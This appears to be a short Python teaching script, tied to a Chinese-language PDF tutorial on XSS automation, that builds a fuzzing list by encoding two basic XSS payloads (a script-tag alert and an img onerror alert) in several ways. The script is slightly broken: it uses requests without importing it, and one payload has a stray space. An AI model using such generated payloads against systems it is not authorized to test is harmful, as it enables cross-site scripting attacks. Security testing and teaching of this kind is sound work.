"""
本代码对应PDF文件中的“XSS 自动化工具运用与开发：自定义脚本开发：Fuzzing 字典生成器”
本代码用于生成XSS测试的Fuzzing字典
"""

import itertools

def generate_payloads(base_payloads, encodings):
    """生成组合 Payload"""
    for payload in base_payloads:
        for encoding in encodings:
            yield encoding(payload)

def html_escape(payload):
    return payload.replace('<', '&lt;').replace('>', '&gt;')

def url_encode(payload):
    return requests.utils.quote(payload)

def js_escape(payload):
    return payload.replace("'", "\\'").replace('"', '\\"')
# 使用
base = ['<script>alert(1)</script>', '< img src=x onerror=alert(1)>']
encodings = [lambda x: x, html_escape, url_encode, js_escape]
for p in generate_payloads(base, encodings):
    print(p)